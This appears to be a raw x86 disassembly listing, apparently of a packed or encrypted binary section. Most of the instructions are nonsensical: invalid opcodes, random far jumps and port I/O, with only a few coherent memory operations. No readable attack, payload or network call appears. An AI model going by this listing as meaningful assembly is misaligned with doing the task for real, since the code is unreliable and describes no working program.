  40442d:	xlat   BYTE PTR ds:[ebx]
  40442e:	js     0x404494
  404430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404431:	jle    0x404475
  404433:	nop
  404434:	dec    ebp
  404435:	aaa    
  404436:	xchg   ebx,eax
  404437:	arpl   WORD PTR [edx],bp
  404439:	jnp    0x40449e
  40443b:	pop    esp
  40443c:	pop    es
  40443d:	call   DWORD PTR [esi-0x5f]
  404440:	mov    dl,0xb6
  404442:	ins    BYTE PTR es:[edi],dx
  404443:	mov    ebx,0xfd147325
  404448:	clc    
  404449:	addr16 sbb eax,0xcf5a87d2
  40444f:	mov    ah,0x1e
  404451:	rcr    DWORD PTR [edx+0x2b1a1e7a],1
  404457:	add    DWORD PTR [ebx+eiz*2-0x7e],esp
  40445b:	pop    edi
  40445c:	or     esp,0xc03464e2
  404462:	mov    cl,0x44
  404464:	xor    bl,dl
  404466:	ss imul ebp,edi,0x1e
  40446a:	cs retf 
  40446c:	mov    WORD PTR [ecx],?
  40446e:	cld    
  40446f:	inc    ecx
  404470:	mov    dl,0x91
  404472:	inc    ebx
  404473:	mov    al,0x9e
  404475:	cmp    BYTE PTR [ebx+0x3516f212],al
  40447b:	mov    ah,bh
  40447d:	int3   
  40447e:	mov    eax,ds:0x68bffd3e
  404483:	inc    ebp
  404484:	rcr    BYTE PTR [esi],cl
  404486:	idiv   BYTE PTR [ebx]
  404488:	ins    DWORD PTR es:[edi],dx
  404489:	xor    bl,al
  40448b:	fstp   TBYTE PTR [ebp+0x472751b0]
  404491:	jmp    0x9e783b33
  404496:	xchg   edi,eax
  404497:	xchg   esp,eax
  404498:	jne    0x4044bf
  40449a:	clc    
  40449b:	pop    ds
  40449c:	and    eax,0xc58243ae
  4044a1:	ss mov dh,0x4e
  4044a4:	dec    edi
  4044a5:	xchg   BYTE PTR [esi+0xa3fce06],dl
  4044ab:	ja     0x40443b
  4044ad:	lods   eax,DWORD PTR ds:[esi]
  4044ae:	repnz push es
  4044b0:	push   edi
  4044b1:	int3   
  4044b2:	sbb    eax,0xefa8b237
  4044b7:	cmp    esp,ecx
  4044b9:	fist   DWORD PTR [edx+edx*2]
  4044bc:	sti    
  4044bd:	and    esi,edi
  4044bf:	dec    esp
  4044c0:	jns    0x40453e
  4044c2:	pop    ebp
  4044c3:	cmp    dh,ah
  4044c5:	imul   esi,DWORD PTR [ebx+0x58],0xb1f2dc6d
  4044cc:	sahf   
  4044cd:	lds    edx,FWORD PTR [ecx+eax*8+0x3b9a081f]
  4044d4:	or     edi,DWORD PTR [ecx+esi*8-0x6]
  4044d8:	stc    
  4044d9:	(bad)  [esi+0x3bd1909c]
  4044df:	sbb    ebx,DWORD PTR [ebx+eiz*4-0x33]
  4044e3:	adc    ebp,DWORD PTR [esi+ecx*2+0x2b1f98f9]
  4044ea:	sbb    al,0x9c
  4044ec:	jp     0x404520
  4044ee:	sahf   
  4044ef:	add    BYTE PTR [ebp+0x5d4a28fd],al
  4044f5:	push   ds
  4044f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f7:	fldenv [esi+edx*8+0x65]
  4044fb:	fcmovnu st,st(6)
  4044fd:	es push edi
  4044ff:	lock repnz inc esi
  404502:	or     DWORD PTR [ecx+0x1e],eax
  404505:	add    BYTE PTR [esi+0x83dab28],cl
  40450b:	pop    ebp
  40450c:	shr    edi,cl
  40450e:	xchg   edx,eax
  40450f:	int3   
  404510:	hlt    
  404511:	repnz lock mov ah,0x74
  404515:	push   cs
  404516:	xchg   ecx,eax
  404517:	sub    DWORD PTR [esi-0x29eef6ba],0xc97ea3dd
  404521:	sub    DWORD PTR [esi+0x14e3fa7],ebp
  404527:	lods   eax,DWORD PTR ds:[esi]
  404528:	in     eax,0x2
  40452a:	mov    eax,0xf3915c43
  40452f:	stos   BYTE PTR es:[edi],al
  404530:	repz rcr DWORD PTR [edi+eiz*4-0xf],cl
  404535:	aaa    
  404536:	pop    ss
  404537:	jae    0x404551
  404539:	or     DWORD PTR [edx+0x3884ed4e],ebp
  40453f:	pop    ebp
  404540:	sbb    ebp,DWORD PTR [esi+0x34f681e5]
  404546:	mov    esi,esi
  404548:	adc    al,0x20
  40454a:	pusha  
  40454b:	xchg   edx,eax
  40454c:	rcr    dh,1
  40454e:	mov    ecx,DWORD PTR [ebx+0x3d]
  404551:	mov    bh,ah
  404553:	mov    esp,0xe57b30f4
  404558:	lods   eax,DWORD PTR ds:[esi]
  404559:	xchg   ecx,esi
  40455b:	pop    ebx
  40455c:	pop    ss
  40455d:	out    dx,eax
  40455e:	cwde   
  40455f:	test   al,0x4d
  404561:	inc    edi
  404562:	jge    0x4045c8
  404564:	arpl   bp,si
  404566:	adc    BYTE PTR [ebx-0x53],0x3f
  40456a:	lahf   
  40456b:	repz into 
  40456d:	call   0xfd673177
  404572:	sub    eax,0x61589af6
  404577:	shr    BYTE PTR [esi-0x686f782d],cl
  40457d:	cwde   
  40457e:	mov    esi,0x458803a1
  404583:	ror    BYTE PTR [eax+ecx*2-0x44],0x83
  404588:	(bad)
  40458b:	or     cl,al
  40458d:	add    ch,BYTE PTR [ecx+ecx*1-0x45]
  404591:	mov    ch,0x70
  404593:	loopne 0x404517
  404595:	inc    edi
  404596:	add    BYTE PTR ds:0xa62e489c,ch
  40459c:	and    BYTE PTR [eax],dl
  40459e:	inc    esi
  40459f:	fs mov bl,0x3e
  4045a2:	mov    DWORD PTR [ebx+0x16b5d0cd],edi
  4045a8:	sbb    eax,0xd15f8e4
  4045ad:	or     ah,BYTE PTR [ebp+0x16]
  4045b0:	xchg   ebp,eax
  4045b1:	jmp    0xb4b5b045
  4045b6:	mov    DWORD PTR [edi],ecx
  4045b8:	lods   al,BYTE PTR ds:[esi]
  4045b9:	jae    0x4045cd
  4045bb:	(bad)  
  4045bc:	fild   WORD PTR [edx+0x3a]
  4045bf:	dec    ebp
  4045c0:	loop   0x40461e
  4045c2:	into   
  4045c3:	mov    esi,0x246ff591
  4045c8:	fdivp  st(2),st
  4045ca:	out    dx,al
  4045cb:	pop    DWORD PTR [ebx+0x30aa8716]
  4045d1:	hlt    
  4045d2:	(bad)  
  4045d3:	clc    
  4045d4:	stc    
  4045d5:	adc    eax,0x4e4805b2
  4045da:	jns    0x40461b
  4045dc:	jbe    0x4045ea
  4045de:	in     eax,0xfb
  4045e0:	jp     0x40456f
  4045e2:	bound  edi,QWORD PTR [esi+eax*4]
  4045e5:	aam    0x3c
  4045e7:	inc    ebp
  4045e8:	ss xor cl,dh
  4045eb:	imul   esp,DWORD PTR [ecx+0x12],0xf9b41880
  4045f2:	mov    cl,0xbd
  4045f4:	retf   
  4045f5:	pop    ss
  4045f6:	fwait
  4045f7:	outs   dx,DWORD PTR ds:[esi]
  4045f8:	mov    al,ds:0xe46d9467
  4045fd:	cmp    eax,DWORD PTR [eax+0x34045e9d]
  404603:	jae    0x404636
  404605:	in     al,0x3b
  404607:	test   BYTE PTR [edi],dl
  404609:	xor    cl,dh
  40460b:	and    al,0x80
  40460d:	in     al,dx
  40460e:	push   ebp
  40460f:	or     eax,0x4622d556
  404614:	nop
  404615:	mov    edx,0x36cbd60e
  40461a:	ja     0x404629
  40461c:	aaa    
  40461d:	sub    DWORD PTR cs:[edx+0x47c0d467],esi
  404624:	fcom   st(0)
  404626:	mov    ?,eax
  404628:	sub    esp,eax
  40462a:	lods   eax,DWORD PTR ds:[esi]
  40462b:	lock dec BYTE PTR [edi-0x60]
  40462f:	lds    esp,FWORD PTR [edi-0x7a7abf75]
  404635:	jg     0x4045fb
  404637:	add    DWORD PTR [ecx+0x60],0xffffffbb
  40463b:	or     ch,BYTE PTR [ebx]
  40463d:	or     cl,al
  40463f:	rcr    BYTE PTR [eax+eiz*8-0x71],1
  404643:	pop    edi
  404644:	adc    BYTE PTR [esi-0x7777a22a],ah
  40464a:	fistp  WORD PTR [esi-0x41]
  40464d:	xchg   esp,eax
  40464e:	stos   DWORD PTR es:[edi],eax
  40464f:	ror    BYTE PTR [ecx+0x7e],cl
  404652:	sub    BYTE PTR [ebx+0x34],0xee
  404656:	mov    ebx,0x2c4ec8e5
  40465b:	or     BYTE PTR [ebx],0xf0
  40465e:	cmp    esi,eax
  404660:	jmp    0x51b4fc81
  404665:	xor    eax,0xadce23ab
  40466a:	or     eax,0x3c3ff753
  40466f:	popa   
  404670:	push   edx
  404671:	sub    eax,0x57aa6cae
  404676:	xor    ch,BYTE PTR [edi+ebp*1+0x7494abce]
  40467d:	xor    BYTE PTR [eax+0x75],ah
  404680:	(bad)  
  404681:	pop    es
  404682:	das    
  404683:	adc    eax,edi
  404685:	call   FWORD PTR [edx+0x4df846cd]
  40468b:	stc    
  40468c:	rol    DWORD PTR [eax+0xa4efae3],0x20
  404693:	clc    
  404694:	(bad)  
  404695:	rcl    BYTE PTR [ebp-0x32],1
  404698:	sti    
  404699:	cmp    dl,BYTE PTR [edi+0x4c8245f8]
  40469f:	aas    
  4046a0:	pushf  
  4046a1:	cmc    
  4046a2:	xchg   ecx,eax
  4046a3:	repz (bad) 
  4046a5:	popa   
  4046a6:	fcom   DWORD PTR [ebp+0x247953cb]
  4046ac:	(bad)  [eax+ecx*8-0x58cea805]
  4046b3:	add    al,BYTE PTR [ebx-0x1c3761ac]
  4046b9:	mov    ecx,0x81be8bf5
  4046be:	sbb    eax,0x68d11aca
  4046c3:	pop    ecx
  4046c4:	and    BYTE PTR [edx],ch
  4046c6:	dec    esi
  4046c7:	xchg   ebp,eax
  4046c8:	inc    esp
  4046c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ca:	pop    ds
  4046cb:	or     ecx,DWORD PTR [ecx]
  4046cd:	ret    
  4046ce:	xor    DWORD PTR [ecx],0xffffffb3
  4046d1:	mov    esp,edx
  4046d3:	add    BYTE PTR [edi],0xf
  4046d6:	call   0x76b7101
  4046db:	loop   0x40467b
  4046dd:	mov    edi,0xfa254796
  4046e2:	test   eax,0xba87759e
  4046e7:	xchg   dh,cl
  4046e9:	stos   DWORD PTR es:[edi],eax
  4046ea:	cmp    esi,DWORD PTR [edi+ecx*1-0x5729a689]
  4046f1:	jmp    0x6eb9:0x6446912f
  4046f8:	rol    BYTE PTR [ecx-0x9],1
  4046fb:	and    al,0xc3
  4046fd:	(bad)  
  4046fe:	add    DWORD PTR ss:[ebp-0x463fc9fe],edx
  404705:	repnz sbb al,BYTE PTR [eax+0x3f]
  404709:	mov    ch,0xc
  40470b:	push   cs
  40470c:	jo     0x4046bc
  40470e:	and    al,0x60
  404710:	pop    esi
  404711:	mov    ds:0x4e7181fc,eax
  404716:	add    DWORD PTR [ebp+0x62440e8d],ebp
  40471c:	cmp    eax,0x25ba655
  404721:	mov    ebx,0xb9a3802b
  404726:	mov    edx,0x34ee785e
  40472b:	push   esi
  40472c:	out    dx,eax
  40472d:	add    eax,0xcfb2cae6
  404732:	pusha  
  404733:	inc    edx
  404734:	mov    fs,di
  404737:	pop    eax
  404738:	mov    al,0x9
  40473a:	icebp  
  40473b:	mov    DWORD PTR [edi],ecx
  40473d:	lods   al,BYTE PTR ds:[esi]
  40473e:	rol    DWORD PTR [edx],1
  404740:	or     DWORD PTR ds:0x428293,0x42824f
  40474a:	shr    edx,0x2
  40474d:	mov    edx,DWORD PTR ds:0x42826f
  404753:	or     DWORD PTR ds:0x42836f,edx
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0x7cc3c08b
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [esi+0x4fe0c8bb],dh
  40477e:	scas   al,BYTE PTR es:[edi]
  40477f:	xchg   edi,eax
  404780:	imul   edi,ebx,0xffffffd9
  404783:	addr16 (bad) 
  404785:	mov    eax,ds:0x30fc5c2
  40478a:	cli    
  40478b:	or     dh,ah
  40478d:	mov    dl,bl
  40478f:	push   0xffffff8b
  404791:	pop    edi
  404792:	and    esp,0xffffffac
  404795:	shr    DWORD PTR [ebx+0x31],0x3
  404799:	xchg   ebx,eax
  40479a:	pop    DWORD PTR [ebp-0x2356ea29]
  4047a0:	pushf  
  4047a1:	fcom   DWORD PTR [esi-0x63]
  4047a4:	jnp    0x404771
  4047a6:	xchg   ecx,eax
  4047a7:	sub    BYTE PTR [eax-0x44],0xd0
  4047ab:	addr16 xchg edx,eax
  4047ad:	(bad)  
  4047b0:	jge    0x4047e2
  4047b2:	int    0x7c
  4047b4:	fisubr DWORD PTR [ebx]
  4047b6:	sub    eax,0xbf97dcde
  4047bb:	dec    edx
  4047bc:	inc    esp
  4047bd:	sub    BYTE PTR [eax+0x12408aa6],0xb5
  4047c4:	fsub   QWORD PTR [esi+esi*4]
  4047c7:	cdq    
  4047c8:	adc    ecx,eax
  4047ca:	int3   
  4047cb:	sub    BYTE PTR [ecx+0x72cab889],dl
  4047d1:	mov    ds:0x8620810,al
  4047d6:	test   BYTE PTR [ebp+0x11],cl
  4047d9:	das    
  4047da:	mov    ebx,0x7d10316e
  4047df:	push   ss
  4047e0:	std    
  4047e1:	les    ecx,FWORD PTR [eax]
  4047e3:	add    dh,0x48
  4047e6:	mov    DWORD PTR [ecx-0x72],ebx
  4047e9:	repnz ds fdivr st,st(5)
  4047ed:	mov    eax,0x1a2f5686
  4047f2:	lahf   
  4047f3:	or     DWORD PTR [ecx-0x44],0xdbef33ca
  4047fa:	lock pop edi
  4047fc:	sbb    bl,BYTE PTR [edx+0x35]
  4047ff:	ja     0x4047fa
  404801:	jne    0x404789
  404803:	sbb    DWORD PTR [ecx+edi*8],esp
  404806:	add    edx,DWORD PTR [edi+edi*2-0x34]
  40480a:	sti    
  40480b:	jnp    0x40487e
  40480d:	nop
  40480e:	fstp   QWORD PTR [esi+0x5]
  404811:	xchg   edi,eax
  404812:	push   edi
  404813:	dec    esi
  404814:	call   0x7205e9ad
  404819:	and    DWORD PTR [eax+0x3c77f95f],0x4a
  404820:	push   eax
  404821:	add    ecx,DWORD PTR [eax+ecx*2+0x48]
  404825:	pop    ss
  404826:	cld    
  404827:	popa   
  404828:	(bad)  
  404829:	(bad)  
  40482a:	sbb    DWORD PTR [edx-0x1f],esi
  40482d:	sub    esp,DWORD PTR [edi-0x2d]
  404830:	pop    ecx
  404831:	call   0x363f002a
  404836:	fstp   DWORD PTR [esi+eax*2]
  404839:	mov    ds:0x192f9897,eax
  40483e:	xor    edx,DWORD PTR [esi]
  404840:	adc    ah,ch
  404842:	imul   DWORD PTR [edi+ebp*1-0x30]
  404846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404847:	nop
  404848:	xchg   eax,edx
  40484a:	out    dx,al
  40484b:	push   ss
  40484c:	cdq    
  40484d:	jecxz  0x4047f0
  40484f:	imul   eax,DWORD PTR [edi+0x26baec30],0xcc88db88
  404859:	or     ecx,DWORD PTR [esi]
  40485b:	sar    BYTE PTR [edi],1
  40485d:	ins    BYTE PTR es:[edi],dx
  40485e:	jp     0x4048ac
  404860:	sub    al,0x61
  404862:	mov    al,ds:0x9f9cd0f1
  404867:	std    
  404868:	daa    
  404869:	jbe    0x404843
  40486b:	gs adc eax,0xdbd8660a
  404871:	fcomp  QWORD PTR [edi-0x27]
  404874:	out    0x33,al
  404876:	mov    ebp,0xcde20eab
  40487b:	add    BYTE PTR [ebp-0x67],0xee
  40487f:	sub    eax,0x24b5897d
  404884:	in     al,dx
  404885:	mov    al,0x2
  404887:	lea    edi,[edi]
  404889:	inc    eax
  40488a:	dec    ecx
  40488b:	test   eax,0xbd2e015b
  404890:	sahf   
  404891:	and    esp,DWORD PTR [edi+0x7eb9d106]
  404897:	int3   
  404898:	mov    ebp,0x785daf08
  40489d:	add    DWORD PTR [edx-0x44],esi
  4048a0:	aam    0xeb
  4048a2:	mov    DWORD PTR [ecx+ebx*1+0x676e52a9],ecx
  4048a9:	xlat   BYTE PTR ds:[ebx]
  4048aa:	mov    ch,0x88
  4048ac:	xchg   esi,eax
  4048ad:	fstp   QWORD PTR [edi+0x40c71593]
  4048b3:	sbb    esp,DWORD PTR [ebx-0x64]
  4048b6:	out    0xea,eax
  4048b8:	test   eax,0xd526cf87
  4048bd:	inc    ebx
  4048be:	add    esi,DWORD PTR ds:0x7b796670
  4048c4:	adc    DWORD PTR [ebp+ebx*1+0x58],edi
  4048c8:	push   edi
  4048c9:	push   ebp
  4048ca:	addr16 pop ds
  4048cc:	ja     0x4048e4
  4048ce:	sub    al,0xf4
  4048d0:	push   es
  4048d1:	call   0xe19aa2ae
  4048d6:	jge    0x4048ff
  4048d8:	push   es
  4048d9:	mov    bh,0xfb
  4048db:	mov    DWORD PTR [ebx],edx
  4048dd:	daa    
  4048de:	mov    dl,0xfc
  4048e0:	mov    ecx,0x31a44068
  4048e5:	(bad)  
  4048e6:	push   0x66
  4048e8:	push   0xd0550510
  4048ed:	sbb    bl,bl
  4048ef:	lods   al,BYTE PTR ds:[esi]
  4048f0:	stos   BYTE PTR es:[edi],al
  4048f1:	enter  0xb7b6,0x8f
  4048f5:	adc    eax,esp
  4048f7:	mov    edx,DWORD PTR [ebx+0x72]
  4048fa:	dec    edx
  4048fb:	call   0xe505:0x6ad33a9d
  404902:	jnp    0x40488b
  404904:	out    dx,eax
  404905:	adc    dl,BYTE PTR [eax]
  404907:	aam    0xc8
  404909:	sub    eax,0x1b30b612
  40490e:	stos   DWORD PTR es:[edi],eax
  40490f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404910:	mov    ds,WORD PTR [edx]
  404912:	push   ecx
  404913:	in     al,dx
  404914:	mov    dh,0x53
  404916:	jmp    0xbd8b:0xf90c1ca5
  40491d:	xchg   ecx,eax
  40491e:	sub    BYTE PTR [esi+edi*1-0x78b25960],bl
  404925:	les    edi,FWORD PTR ds:0x59263cf9
  40492b:	adc    eax,0x53fa6c79
  404930:	mov    esp,0xddd69a8e
  404935:	mov    edi,0x2be52b74
  40493a:	push   ds
  40493b:	inc    ebx
  40493c:	fwait
  40493d:	aam    0x55
  40493f:	shl    DWORD PTR [ecx+0x5e],cl
  404942:	stc    
  404943:	fsub   DWORD PTR [esi]
  404945:	call   0x19f0:0x7f29b0dc
  40494c:	push   ebx
  40494d:	jmp    0x1c10:0x68770089
  404954:	outs   dx,DWORD PTR ds:[esi]
  404955:	popa   
  404956:	and    al,0xb2
  404958:	test   BYTE PTR ds:0x6d1ae6ce,0xe3
  40495f:	sbb    eax,0xfffffff1
  404962:	aas    
  404963:	mov    dl,0x5e
  404965:	dec    edi
  404966:	push   0xffffffb0
  404968:	or     cl,BYTE PTR [ecx+0x3d]
  40496b:	push   ss
  40496c:	dec    ebx
  40496d:	xor    eax,0x892bba9a
  404972:	ins    BYTE PTR es:[edi],dx
  404973:	repz pop ebp
  404975:	test   BYTE PTR [edx-0x4b9530dc],bl
  40497b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40497c:	lea    ecx,[edi+0x2a]
  40497f:	push   esi
  404980:	xor    ch,al
  404982:	adc    DWORD PTR [ebx+eiz*8-0x7b],esp
  404986:	and    eax,0xf6b93d9f
  40498b:	repz dec esi
  40498d:	pop    ds
  40498e:	sbb    ecx,DWORD PTR [ebx-0x32]
  404991:	xor    al,0x57
  404993:	inc    esp
  404994:	add    esi,DWORD PTR [edi]
  404996:	or     esp,DWORD PTR [esi]
  404998:	fistp  WORD PTR [esp+ebp*2-0xb3e405c]
  40499f:	lods   eax,DWORD PTR ds:[esi]
  4049a0:	mov    ah,0x40
  4049a2:	or     edx,eax
  4049a4:	es jne 0x4049d2
  4049a7:	fild   DWORD PTR [edi-0x126db5ae]
  4049ad:	mov    ds:0xe07eb355,al
  4049b2:	mov    edi,0x60eac76d
  4049b7:	pop    eax
  4049b8:	imul   edx,DWORD PTR [ebx+0x11],0x24411a60
  4049bf:	je     0x404954
  4049c1:	adc    edx,esp
  4049c3:	cdq    
  4049c4:	sub    DWORD PTR [edx-0x78],esi
  4049c7:	outs   dx,BYTE PTR ds:[esi]
  4049c8:	inc    ebx
  4049c9:	sub    al,0x5f
  4049cb:	sbb    ebp,0xffffffb2
  4049ce:	jne    0x40496e
  4049d0:	cld    
  4049d1:	(bad)  
  4049d2:	xchg   esp,eax
  4049d3:	retf   0x2234
  4049d6:	pop    DWORD PTR [esi+eiz*8]
  4049d9:	or     esp,ebx
  4049db:	mov    ds:0xa64f1304,al
  4049e0:	inc    ebp
  4049e1:	jnp    0x404999
  4049e3:	pop    edx
  4049e4:	xchg   DWORD PTR [esi+edx*4-0x2c],ecx
  4049e8:	fsubr  DWORD PTR [eax]
  4049ea:	and    DWORD PTR [ebp-0x5d316ec6],ebx
  4049f0:	adc    BYTE PTR [esi],dl
  4049f2:	xor    al,0xa0
  4049f4:	sub    al,0x78
  4049f6:	shld   DWORD PTR [edi],esi,0x2b
  4049fa:	retf   0xb7bd
  4049fd:	fbld   TBYTE PTR ds:0xa4e30fb8
  404a03:	ins    BYTE PTR es:[edi],dx
  404a04:	nop
  404a05:	data16 add dh,cl
  404a08:	retf   
  404a09:	retf   0x5ad9
  404a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a0d:	adc    ecx,edx
  404a0f:	int    0x26
  404a11:	pop    edx
  404a12:	sub    eax,0xa46e6bdc
  404a17:	sub    ebp,DWORD PTR [ecx]
  404a19:	cs cld 
  404a1b:	sub    BYTE PTR [esi+0x16],dh
  404a1e:	mov    bh,0xb5
  404a20:	fs mov esp,0xa54f349a
  404a26:	out    0xba,eax
  404a28:	popf   
  404a29:	pop    ecx
  404a2a:	mov    cl,0x9b
  404a2c:	pop    ebx
  404a2d:	jecxz  0x404a6e
  404a2f:	dec    edi
  404a30:	sbb    al,0xf1
  404a32:	push   0x205a44
  404a37:	mov    ?,WORD PTR [edx+0x43]
  404a3a:	cmc    
  404a3b:	in     eax,0xa1
  404a3d:	mov    ebp,0xa76247d1
  404a42:	call   0x9465:0xa48029b
  404a49:	(bad)
  404a4c:	dec    eax
  404a4d:	sub    eax,0x11038a0c
  404a52:	imul   esi,DWORD PTR [eax-0x72],0xa37111f9
  404a59:	xlat   BYTE PTR ds:[ebx]
  404a5a:	jecxz  0x404a34
  404a5c:	jle    0x404a68
  404a5e:	pop    ss
  404a5f:	fbstp  TBYTE PTR [edx-0x31]
  404a62:	add    dl,BYTE PTR [ecx+0xbfe3129]
  404a68:	retf   
  404a69:	mov    ecx,0xd8a2783
  404a6e:	and    BYTE PTR [edi],ah
  404a70:	shr    ebp,1
  404a72:	cmp    BYTE PTR [edi-0x60],0xf4
  404a76:	push   esi
  404a77:	dec    ecx
  404a78:	int3   
  404a79:	add    al,0x3f
  404a7b:	retf   0x4685
  404a7e:	arpl   dx,ax
  404a80:	outs   dx,BYTE PTR ds:[esi]
  404a81:	cmp    ch,al
  404a83:	cmp    eax,0x7fd2ae3b
  404a88:	lock mov ebx,0xbd8c166c
  404a8e:	inc    edi
  404a8f:	lahf   
  404a90:	ret    
  404a91:	repz imul esp,eax,0x58
  404a95:	push   0x9636e569
  404a9a:	fisubr WORD PTR [ebx-0x58]
  404a9d:	fstp   DWORD PTR [esi+0xd]
  404aa0:	test   bl,al
  404aa2:	aas    
  404aa3:	pop    edi
  404aa4:	pop    eax
  404aa5:	iret   
  404aa6:	lahf   
  404aa7:	dec    esp
  404aa8:	pop    esp
  404aa9:	adc    bl,BYTE PTR [edi+ebp*8+0x10]
  404aad:	add    al,0xa1
  404aaf:	jp     0x404a42
  404ab1:	shr    BYTE PTR [ecx],0xa6
  404ab4:	(bad)  
  404ab5:	jo     0x404adf
  404ab7:	dec    edx
  404ab8:	loopne 0x404b35
  404aba:	add    edi,DWORD PTR [esi-0x14]
  404abd:	mov    eax,ds:0x65e62a81
  404ac2:	(bad)  
  404ac3:	ja     0x404a8f
  404ac5:	push   edx
  404ac6:	in     eax,dx
  404ac7:	pop    ss
  404ac8:	inc    edx
  404ac9:	mov    DWORD PTR [ecx+0x5b],esp
  404acc:	jp     0x404b0e
  404ace:	repz iret 
  404ad0:	xchg   ebx,eax
  404ad1:	outs   dx,BYTE PTR ds:[esi]
  404ad2:	into   
  404ad3:	lods   eax,DWORD PTR ds:[esi]
  404ad4:	sar    BYTE PTR [esi+ecx*8-0x6fd22403],cl
  404adb:	mov    esi,0x902624ea
  404ae0:	and    bh,ch
  404ae2:	stc    
  404ae3:	jo     0x404afa
  404ae5:	mov    eax,0x5e66b3d8
  404aea:	lea    eax,[edx]
  404aec:	push   ss
  404aed:	cli    
  404aee:	shl    ebx,cl
  404af0:	jns    0x404af5
  404af2:	mov    al,0xf0
  404af4:	or     DWORD PTR [edi+ecx*8-0x5f7d23a2],eax
  404afb:	sub    eax,0xa37be31d
  404b00:	std    
  404b01:	xlat   BYTE PTR ds:[ebx]
  404b02:	fwait
  404b03:	and    esi,DWORD PTR [edi]
  404b05:	cmp    DWORD PTR [edi-0x3c],edx
  404b08:	(bad)  
  404b09:	mov    ds:0x5860ca6a,eax
  404b0e:	mov    ebx,0xeaebd18a
  404b13:	mov    bl,0x61
  404b15:	inc    esp
  404b16:	xor    ebp,DWORD PTR [edi-0x10]
  404b19:	outs   dx,BYTE PTR ds:[esi]
  404b1a:	sub    ebx,ebx
  404b1c:	stos   BYTE PTR es:[edi],al
  404b1d:	and    BYTE PTR [esi+ebp*8],dl
  404b20:	pop    edx
  404b21:	jp     0x404b1c
  404b23:	mov    ds:0xad3f5e2b,eax
  404b28:	addr16 imul edx,eax,0x2f650653
  404b2f:	test   al,0x4c
  404b31:	xchg   ebx,eax
  404b32:	shl    BYTE PTR [esi+0x75],cl
  404b35:	jg     0x404ac4
  404b37:	lds    edi,FWORD PTR [edi-0x74f4742b]
  404b3d:	push   ebx
  404b3e:	add    al,0x31
  404b40:	jge    0x404b26
  404b42:	add    DWORD PTR ds:0x428283,0x4282f7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	and    al,0xbb
  404b61:	cmp    DWORD PTR [eax+eiz*2-0x3f],0x18
  404b66:	sbb    BYTE PTR [esi-0x70e7e7ee],bl
  404b6c:	xlat   BYTE PTR ds:[ebx]
  404b6d:	(bad)
  404b70:	jbe    0x404b7e
  404b72:	lock pushf 
  404b74:	(bad)  
  404b75:	mov    BYTE PTR [edi-0x33],dh
  404b78:	xor    DWORD PTR [edx-0x56145f64],0x947237a1
  404b82:	popf   
  404b83:	and    eax,0x76f1d061
  404b88:	cdq    
  404b89:	sbb    al,0xe2
  404b8b:	in     eax,0xb1
  404b8d:	retf   0x9329
  404b90:	xor    BYTE PTR [ebx+0xe84731e],cl
  404b96:	daa    
  404b97:	pop    ecx
  404b98:	fcomip st,st(6)
  404b9a:	or     eax,0x8ddb618a
  404b9f:	and    al,BYTE PTR [bx+si+0x58]
  404ba3:	jbe    0x404b44
  404ba5:	add    BYTE PTR [ecx+eax*1+0xf516587],0xad
  404bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bae:	arpl   WORD PTR [ebx+0x30],di
  404bb1:	inc    ebx
  404bb2:	add    esp,DWORD PTR [ebx-0x3359c6b9]
  404bb8:	or     eax,0xe9e7e825
  404bbd:	ins    BYTE PTR es:[edi],dx
  404bbe:	popa   
  404bbf:	test   al,0x1e
  404bc1:	jnp    0x404bc0
  404bc3:	and    esi,DWORD PTR [edi+0x250f7ea0]
  404bc9:	dec    ebp
  404bca:	popf   
  404bcb:	sub    eax,0x45a33a22
  404bd0:	inc    eax
  404bd1:	xlat   BYTE PTR ds:[ebx]
  404bd2:	adc    DWORD PTR [edi+0x54eccd52],esp
  404bd8:	test   al,0x3b
  404bda:	jnp    0x404c25
  404bdc:	mov    ah,0x19
  404bde:	and    BYTE PTR [edx-0x54da4058],ch
  404be4:	call   0x971e3ea7
  404be9:	pop    edi
  404bea:	mov    dh,0x12
  404bec:	nop
  404bed:	mov    ds:0xbe4ee001,al
  404bf2:	mov    ecx,0xbc4bec1d
  404bf7:	mov    ah,0xe6
  404bf9:	test   al,0xf9
  404bfb:	and    eax,DWORD PTR [ebx]
  404bfd:	cmc    
  404bfe:	sbb    BYTE PTR [edx+0x6d],ah
  404c01:	scas   eax,DWORD PTR es:[edi]
  404c02:	scas   eax,DWORD PTR es:[edi]
  404c03:	push   es
  404c04:	in     eax,dx
  404c05:	fidiv  WORD PTR [ebx-0x13]
  404c08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c09:	xor    dh,ah
  404c0b:	push   edi
  404c0c:	xchg   edx,eax
  404c0d:	iret   
  404c0e:	jle    0x404c05
  404c10:	sbb    edi,ecx
  404c12:	nop
  404c13:	loopne 0x404bdf
  404c15:	loop   0x404c32
  404c17:	(bad)  
  404c18:	fdivr  st(7),st
  404c1a:	cmp    DWORD PTR [eax+ecx*2-0x70],0x5c
  404c1f:	or     ah,ch
  404c21:	mov    ch,0x1d
  404c23:	aas    
  404c24:	out    dx,al
  404c25:	push   0x135d93ed
  404c2a:	lods   eax,DWORD PTR ds:[esi]
  404c2b:	jmp    0x84b:0xbb172e6f
  404c32:	adc    al,0x80
  404c34:	call   0xe412391f
  404c39:	aad    0x6e
  404c3b:	retf   0xaec2
